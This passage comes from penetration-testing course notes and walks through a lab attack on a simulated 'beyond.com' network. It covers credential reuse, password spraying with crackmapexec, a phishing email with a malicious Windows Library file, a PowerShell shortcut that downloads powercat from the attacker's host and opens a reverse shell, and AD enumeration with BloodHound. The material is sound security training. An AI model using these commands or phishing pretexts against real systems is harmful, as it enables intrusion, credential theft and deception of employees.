diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
-
```

Nice! By displaying the differences between commits, we identified another set of credentials
+ The approach of automating tasks with _sshpass_ is commonly used to provide a password in an non-interactive way for scripts
+ Before we conclude this section, let's add the username and password to **creds.txt** on our Kali machine

**NOTE**: In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system
+ Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as _daniela_

Let's summarize what we've achieved in this section
+ We used the linPEAS automated enumeration script to identify potentially sensitive information and privilege escalation vectors
+ The script identified that **/usr/bin/git** can be run with sudo as user _daniela_, the WordPress directory is a Git repository, and a cleartext password is used in the WordPress database settings
+ By abusing the sudo command, we successfully elevated our privileges
+ Then, we identified a previously removed bash script in the Git repository and displayed it 
+ This script contained a new username and password

In the next Learning Unit, we'll structure and leverage the information we've obtained in an attack, which will provide access to the internal network

## Gaining Access to the Internal Network
In the previous Learning Unit, we obtained privileged access to WEBSRV1
+ In addition, we identified several passwords and usernames

In this Learning Unit, we'll leverage this information
+ First, we'll attempt to confirm a valid set of credentials and then we'll use them to get access to the internal network by preparing and sending a phishing e-mail

### Domain Credentials
In this section, we'll attempt to identify valid combinations of usernames and passwords on MAILSRV1
+ Let's begin by using the current information in our **creds.txt** file to create a list of usernames and passwords
+ Let's begin by reviewing the current information in **creds.txt** 
```
kali@kali:~/beyond$ cat creds.txt                  
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)

Other identified users:
marcus
```
+ Based on the output, we'll create a list of usernames containing _marcus_, _john_, and _daniela_ 
+ Because _wordpress_ is not a real user but is used for the database connection of the WordPress instance on WEBSRV1, we'll omit it
	+ In addition, we'll create a password list containing _tequieromucho_, _DanielKeyboard3311_, and _dqsTwTpZPn#nL_

Both lists and their contents are shown in the following listing:
```
kali@kali:~/beyond$ cat usernames.txt                                         
marcus
john
daniela

kali@kali:~/beyond$ cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

Now we have two lists containing the usernames and passwords we have identified so far

Our next step is to use **crackmapexec** and check these credentials against SMB on MAILSRV1
+ We'll specify **--continue-on-success** to avoid stopping at the first valid credentials
```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```
+ Above shows that CrackMapExec identified one valid set of credentials
+ This isn't much of a surprise since we retrieved the username and password from the staging script on WEBSRV1
+ However, _john_ could have changed their password in the meantime

The output shows another great CrackMapExec feature: it identified the domain name and added it to the usernames
+ This means that MAILSRV1 is a domain-joined machine and we have identified a valid set of domain credentials

Now that we have valid domain credentials, we need to come up with a plan for our next steps
+ Reviewing the CrackMapExec output and the port scan for MAILSRV1, we don't have many options
+ We have identified the mail server and SMB, but no services such as WinRM or RDP
+ In addition, the scan showed that _john_ is not a local administrator on MAILSRV1 as indicated by the missing _Pwn3d!_

This provides us with two options
+ We can further enumerate SMB on MAILSRV1 and check for sensitive information on accessible shares or we can prepare a malicious attachment and send a phishing email as _john_ to _daniela_ and _marcus_ 

We should be aware that CrackMapExec outputs _STATUS_LOGON_FAILURE_ when a password for an existing user is not correct, but also when a user does not exist at all
+ Therefore, we cannot be sure at this point that the domain user accounts _daniela_ and _marcus_ even exist

Let's choose option one first and leverage CrackMapExec to list the SMB shares and their permissions on MAILSRV1 by providing **--shares** and _john_'s credentials
+ We may identify accessible shares containing additional information that we can use for the second option
```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
```
+ Above shows that CrackMapExec only identified the default shares on which we have no actionable permissions

At this point, we only have the second option left, preparing an email with a malicious attachment and sending it to _daniela_ and _marcus_

Let's summarize what we did in this section
+ First, we used the information we retrieved in the previous Learning Unit and leveraged it in a password attack against MAILSRV1
+ This password attack resulted in discovering one valid set of credentials
+ Then, we enumerated the SMB shares on MAILSRV1 as _john_ without any actionable results

## Phishing for Access
In this section, we'll perform a client-side attack by sending a phishing e-mail
+ Throughout this course, we've mainly discussed two client-side attack techniques: Microsoft Office documents containing Macros and Windows Library files in combination with shortcut files

Because we don't have any information about the internal machines or infrastructure, we'll choose the second technique as Microsoft Office may not be installed on any of the target systems
+ For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files

Let's begin by setting up the WebDAV share on our Kali machine on port 80 with _wsgidav_
+ In addition, we'll create the **/home/kali/beyond/webdav** directory as the WebDAV root directory
```
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
```
+ Above shows that our WebDAV share is now served on port 80 with anonymous access settings

Now, let's connect to WINPREP via RDP as _offsec_ with a password of _lab_ in order to prepare the Windows Library and shortcut files
+ Once connected, we'll open _Visual Studio Code_ and create a new text file on the desktop named **config.Library-ms**
![[Pasted image 20240108150359.png]]

Now, let's copy the Windows Library code we previously used in the _Client-Side Attacks_ Module, paste it into Visual Studio Code, and check that the IP address points to our Kali machine:
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Let's save the file and transfer it to **/home/kali/beyond** on our Kali machine
+ Next, we'll create the shortcut file on WINPREP
+ For this, we'll right-click on the Desktop and select _New_ > _Shortcut_ 
+ A victim double-clicking the shortcut file will download PowerCat and create a reverse shell
+ We can enter the following command to achieve this:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
+ Once we enter the command and **install** as shortcut file name, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory

Our next step is to serve PowerCat via a Python3 web server
+ Let's copy **powercat.ps1** to **/home/kali/beyond** and serve it on port 8000 as we have specified in the shortcut's PowerShell command
```
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Once the Python3 web server is running, we can start a Netcat listener on port 4444 in a new terminal tab to catch the incoming reverse shell from PowerCatL
```
kali@kali:~/beyond$ nc -nvlp 4444      
listening on [any] 4444 ...
```

With Netcat running, all services and files are prepared. Now, let's create the email
+ We could also use the WebDAV share to serve Powercat instead of the Python3 web server
+ However, serving the file via another port provides us additional flexibility

To send the email, we'll use the command-line SMTP test tool _swaks_
+ As a first step, let's create the body of the email containing our pretext
+ Because we don't have specific information about any of the users, we have to use something more generic
+ Fortunately, we obtained some information about the target company on WEBSRV1 within the Git repository
	+ Including information only known to employees or staff will tremendously increase our chances that an attachment is opened

We'll create the **body.txt** file in **/home/kali/beyond** with the following text:
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
+ Hopefully this text will convince _marcus_ or _daniela_ to open our attachment
+ In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target
+ Based on this information, we could create more tailored emails and improve our chances of success tremendously

Now we are ready to build the swaks command to send the emails
+ ll provide **`daniela@beyond.com`** and **`marcus@beyond.com`** as recipients of the email to **-t**, **`john@beyond.com`** as name on the email envelope (sender) to **--from**, and the Windows Library file to **--attach**
+ Next, we'll enter **--suppress-data** to summarize information regarding the SMTP transactions
+ For the email subject and body, we'll provide **Subject: Staging Script** to **--header** and **body.txt** to **--body**
+ In addition, we'll enter the IP address of MAILSRV1 for **--server**
+ Finally, we'll add **-ap** to enable password authentication

The complete command is shown in the following listing
+ Once entered, we have to provide the credentials of _john_:
```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

After waiting a few moments, we receive requests for our WebDAV and Python3 web servers
+ Let's check the Netcat listener:
```
listening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```
+ Above shows that our client-side attack via email was successful and we obtained an interactive shell on a machine

Let's display the current user, hostname, and IP address to confirm that we have an initial foothold in the internal network
```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```
+ Above shows that we landed on the CLIENTWK1 system as domain user _marcus_
+ In addition, the IP address of the system is _172.16.6.243/24_, indicating an internal IP range
+ We should also document the IP address and network information, such as the subnet and gateway in our workspace directory

Let's briefly summarize what we did in this section
+ First, we set up our Kali machine to provide the necessary services and files for our attack
+ Then, we prepared a Windows Library and shortcut file on WINPREP
+ Once we sent our email with the attachment, we received an incoming reverse shell from CLIENTWK1 in the internal network

## Enumerating the Internal Network
In the previous Learning Unit, we obtained an initial foothold on the CLIENTWK1 machine
+ Because we have no information about the local system or the internal network yet, we have to gather information on both
+ We'll first enumerate CLIENTWK1 and then the Active Directory environment
+ Our goal is to identify potential lateral movement vectors or ways to elevate our privileges

### Situational Awareness
In this section, we'll attempt to gain situational awareness on the CLIENTWK1 system and the internal network
+ First, we'll perform local enumeration on CLIENTWK1 to obtain an overview of the system and identify potentially valuable information and data
+ Then, we'll enumerate the domain to discover users, computers, domain administrators, and potential vectors for lateral movement and privilege escalation
+ For this Learning Unit, we'll not explicitly store every result in our workspace directory on Kali
	+ However, to get used to the documenting process you should create notes of all findings and information while following along

Let's start with enumerating the CLIENTWK1 machine
+ Let's copy the 64-bit winPEAS executable to the directory served by the Python3 web server
+ On CLIENTWK1, we'll change the current directory to the home directory for _marcus_ and download _winPEAS_ from our Kali machine
+ Once downloaded, we'll launch it 
```
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus

PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe

PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
...
```

Let's review some of the results provided by winPEAS
+ We'll start with the _Basic System Information_ section
```
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
```
+ Above shows that winPEAS detected CLIENTWK1's operating system as Windows 10 Pro
+ As we have learned in the course, winPEAS may falsely detect Windows 11 as Windows 10, so let's manually check the operating system with **systeminfo**:
```
PS C:\Users\marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```
+ Indeed, Windows 11 is the operating system on CLIENTWK1
	+ If we had blindly relied on the winPEAS results, we may have made the wrong assumptions from the beginning
	+ With experience, a penetration tester will develop a sense for which information from automated tools should be double-checked

Going back to review the winPEAS output, we come across the AV section
```
����������͹ AV Information
  [X] Exception: Object reference not set to an instance of an object.
    No AV was detected!!
    Not Found
```
+ No AV has been detected
+ This will make the use of other tools and payloads such as Meterpreter much easier

Let's also review the network information such as _Network Ifaces and known hosts_ and _DNS cached_:
```
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
        Gateways: 172.16.6.254
        DNSs: 172.16.6.240
        Known hosts:
          169.254.255.255       00-00-00-00-00-00     Invalid
          172.16.6.240          00-50-56-8A-08-34     Dynamic
          172.16.6.254          00-50-56-8A-DA-71     Dynamic
          172.16.6.255          FF-FF-FF-FF-FF-FF     Static
...

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.6.240
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.6.254
```
+ Above shows that the DNS entries for **mailsrv1.beyond.com** (172.16.6.254) and **dcsrv1.beyond.com** (172.16.6.240) are cached on CLIENTWK1
+ Based on the name, we can assume that DCSRV1 is the domain controller of the **beyond.com** domain

Furthermore, because MAILSRV1 is detected with the internal IP address of _172.16.6.254_ and we enumerated the machine from an external perspective via _192.168.50.242_, we can safely assume that this is a dual-homed host
+ As we did for credentials, let's create a text file named **computer.txt** in **/home/kali/beyond/** to document identified internal machines and additional information about them
```
kali@kali:~/beyond$ cat computer.txt                                        
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack
+ However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab environment
+ Therefore, it is not necessary to get administrative privileges on every machine
+ While we skipped over most of the winPEAS results, we should examine the results thoroughly as we would in a real penetration test
	+ After the local enumeration of the system, we should have obtained key pieces of information, which we listed in the _Situational Awareness_ section of the _Windows Privilege Escalation_ Module

Since we haven't identified a privilege escalation vector via winPEAS and there is nothing else actionable on the system, such as a Password Manager, let's start enumerating the AD environment and its objects
+ We learned several techniques in this course to perform this kind of enumeration
+ For this Module, we'll use _BloodHound_ with the _SharpHound.ps1_ collector, which we discussed in the _Active Directory Introduction and Enumeration_ Module

First, we'll copy the PowerShell collector to **/home/kali/beyond** in a new terminal tab to serve it via the Python3 web server on port 8000
```
kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

Since our Python3 web server is still running on port 8000, we can download the PowerShell script on the target machine and import it in a newly spawned PowerShell session with the ExecutionPolicy set to **Bypass**
```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
```

Now, we can execute **Invoke-BloodHound** by providing **All** to **-CollectionMethod** to invoke all available collection methods
```
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2022-10-10T07:24:34.5781410-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:34.5937984-07:00|INFORMATION|Initializing SharpHound at 7:24 AM on 10/10/2022
2022-10-10T07:24:35.0781142-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:35.3281888-07:00|INFORMATION|Beginning LDAP search for beyond.com
2022-10-10T07:24:35.3906114-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-10-10T07:24:35.3906114-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-10-10T07:25:06.1421842-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 92 MB RAM
2022-10-10T07:25:21.6307386-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-10-10T07:25:21.6932468-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Status: 98 objects finished (+98 2.130435)/s -- Using 103 MB RAM
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Enumeration finished in 00:00:46.5180822
2022-10-10T07:25:21.9414294-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
 58 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-10-10T07:25:21.9570748-07:00|INFORMATION|SharpHound Enumeration Completed at 7:25 AM on 10/10/2022! Happy Graphing!
```

Once SharpHound has finished, we can list the files in the directory to locate the Zip archive containing our enumeration results
```
PS C:\Users\marcus> dir  
dir

    Directory: C:\Users\marcus

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         9/29/2022   1:49 AM                Contacts                                                             
d-r---         9/29/2022   1:49 AM                Desktop                                                              
d-r---         9/29/2022   4:37 AM                Documents                                                            
d-r---         9/29/2022   4:33 AM                Downloads                                                            
d-r---         9/29/2022   1:49 AM                Favorites                                                            
d-r---         9/29/2022   1:49 AM                Links                                                                
d-r---         9/29/2022   1:49 AM                Music                                                                
d-r---         9/29/2022   1:50 AM                OneDrive                                                             
d-r---         9/29/2022   1:50 AM                Pictures                                                             
d-r---         9/29/2022   1:49 AM                Saved Games                                                          
d-r---         9/29/2022   1:50 AM                Searches                                                             
d-r---         9/29/2022   4:30 AM                Videos                                                               
-a----        10/10/2022   7:25 AM          11995 20221010072521_BloodHound.zip                                     
-a----        10/10/2022   7:23 AM        1318097 SharpHound.ps1                                                       
-a----        10/10/2022   5:02 AM        1936384 winPEAS.exe                                                          
-a----        10/10/2022   7:25 AM           8703 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin 
```

Let's transfer the file to our Kali machine then start _neo4j_ and BloodHound
+ Once BloodHound is started, we'll upload the zip archive with the _Upload Data_ function
![[Pasted image 20240108153446.png]]
+ Once the upload is finished, we can start the enumeration of the AD environment with BloodHound

Before we start, let's briefly review some of BloodHound's capabilities
+ As we have learned, BloodHound contains various pre-built queries such as _Find all Domain Admins_
+ These queries are built with the _Cypher Query Language_
+ In addition to the pre-built queries, BloodHound also allows us to enter custom queries via the _Raw Query_ function at the bottom of the GUI

Since we are currently interested in basic domain enumeration, such as listing AD users and computers, we have to build and enter custom queries as the pre-built functions don't provide these capabilities
+ Let's build a raw query to display all computers identified by the collector
+ The query starts with the keyword **MATCH**, which is used to select a set of objects
+ Then, we set the variable **m** containing all objects in the database with the property **Computer**
+ Next, we use the **RETURN** keyword to build the resulting graph based on the objects in m
```
MATCH (m:Computer) RETURN m
```

Let's enter this query in the _Raw Query_ section and build the graph:
![[Pasted image 20240108153608.png]]
+ Above shows that there are four computer objects in the domain
+ By clicking on the nodes, we can obtain additional information about the computer objects, such as the operating system:
```
DCSRV1.BEYOND.COM - Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM - Windows 11 Pro
```

In addition to CLIENTWK1, on which we have an interactive shell, BloodHound has also identified the already known domain controller DCSRV1 and dual-homed mail server MAILSRV1
+ Furthermore, it discovered another machine named INTERNALSRV1
+ Let's obtain the IP address for INTERNALSRV1 with **nslookup**:
```
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.6.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.6.241
```
+ Above shows that the IP address for INTERNALSRV1 is 172.16.6.241
+ Let's add this information to **computer.txt** on our Kali machine:
```
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.241 - INTERNALSRV1.BEYOND.COM

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

Next, we want to display all user accounts on the domain
+ For this, we can replace the **Computer** property of the previous query with **User**:
```
MATCH (m:User) RETURN m
```
+ Output
![[Pasted image 20240108153729.png]]
+ Above shows that apart from the default AD user accounts, there are four other user account objects in the domain:
```
BECCY
JOHN
DANIELA
MARCUS
```

We already identified _john_ and _marcus_ as valid domain users in previous steps
+ However, we haven't established yet if _daniela_ is also a domain user and not just a local user on WEBSRV1
+ In addition, we discovered a new user named _beccy_
+ Let's update **usernames.txt** accordingly

To be able to use some of BloodHound's pre-built queries, we can mark _marcus_ (interactive shell on CLIENTWK1) and _john_ (valid credentials) as _Owned_
+ To do this, we'll right-click on the _MARCUS@BEYOND.COM_ and _JOHN@BEYOND.COM_ nodes and select _Mark User as Owned_

Next, let's display all domain administrators by using the pre-built _Find all Domain Admins_ query under the _Analysis_ tab: 
![[Pasted image 20240108153937.png]]
+ Above shows that apart from the default domain _Administrator_ account, _beccy_ is also a member of the _Domain Admins_ group

In a real penetration test, we should also examine domain groups and GPOs
+ Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems
+ For this simulated penetration test, we'll skip these two enumeration steps as they provide no additional value for this environment

Next, let's use some of the pre-built queries to find potential vectors to elevate our privileges or gain access to other systems
+ We'll run the following pre-built queries:
- _Find Workstations where Domain Users can RDP_
- _Find Servers where Domain Users can RDP_
- _Find Computers where Domain Users are Local Admin_
- _Shortest Path to Domain Admins from Owned Principals_

Unfortunately, none of these queries return any results
+ This means BloodHound didn't identify any workstations or servers where _Domain Users_ can log in via RDP

In addition, no _Domain Users_ are a local _Administrator_ on any computer objects
+ Therefore, we don't have privileged access on any domain computers as _john_ or _marcus_

Finally, there are no direct paths from owned users to the _Domain Admins_ group that BloodHound could identify

These pre-built queries are often a quick and powerful way to identify low hanging fruit in our quest to elevate our privileges and gain access to other systems
+ Because BloodHound didn't provide us with actionable vectors, we have to resort to other methods
+ We could have also used PowerView or LDAP queries to obtain all of this information
	+ However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming
	+ It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time
	+ We can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view

Before we further enumerate the domain in the next section, let's summarize the information we've obtained so far
+ We identified four computer objects and four user accounts and learned that _beccy_ is a member of the _Domain Admins_ group, making it a high value target
+ Furthermore, we ruled out some vectors that would have provided us access to other systems or privileged users

### Services and Sessions
In the previous section, we performed basic enumeration to obtain an understanding of the Active Directory environment
+ In this section, we'll further enumerate the target network to identify potential attack vectors
+ First, we'll review all active user sessions on machines
+ Then, we'll examine user accounts for the existence of _SPNs_
+ Finally, we'll leverage tools such as Nmap and CrackMapExec via a _SOCKS5_ proxy to identify accessible services

To review active sessions, we'll again use a custom query in BloodHound
+ Since Cypher is a querying language, we can build a relationship query with the following syntax
```
(NODES)-[:RELATIONSHIP]->(NODES)
```

The relationship for our use case is **[:HasSession]**
+ The first node of the relationship specified by a property is **(c:Computer)** and the second is **(m:User)**
+ Meaning, the edge between the two nodes has its source at the computer object
+ We'll use **p** to store and display the data
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

Now, let's enter the custom query in BloodHound:
![[Pasted image 20240108161603.png]]
+ Above shows that our query resulted in three active sessions
+ As expected, CLIENTWK1 has an active session with the user _marcus_

Interestingly, the previously identified domain administrator account _beccy_ has an active session on MAILSRV1
+ If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user

The user of the third active session is displayed as a SID
+ BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine
+ For this session, this means that the local _Administrator_ (indicated by RID 500) has an active session on INTERNALSRV1

Our next step is to identify all _kerberoastable_ users in the domain
+ To do so, we can use the _List all Kerberoastable Accounts_ pre-built query in BloodHound
![[Pasted image 20240108161803.png]]
+ Above shows that apart from _krbtgt_, _daniela_ is also kerberoastable
+ The _krbtgt_ user account acts as service account for the _Key Distribution Center_ (KDC) and is responsible for encrypting and signing Kerberos tickets
	+ When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. 
	+ Therefore, we can often safely skip _krbtgt_ in the context of Kerberoasting

Let's examine the SPN for _daniela_ in BloodHound via the _Node Info_ menu by clicking on the node:
![[Pasted image 20240108161852.png]]
+ Above shows the mapped SPN **`http/internalsrv1.beyond.com`**
+ Based on this, we can assume that a web server is running on INTERNALSRV1
+ Once we've performed Kerberoasting and potentially obtained the plaintext password for _daniela_, we may use it to access INTERNALSRV1

However, as we have stated before, finding an actionable vector should not interrupt our enumeration process
+ We should collect all information, prioritize it, and then perform potential attacks

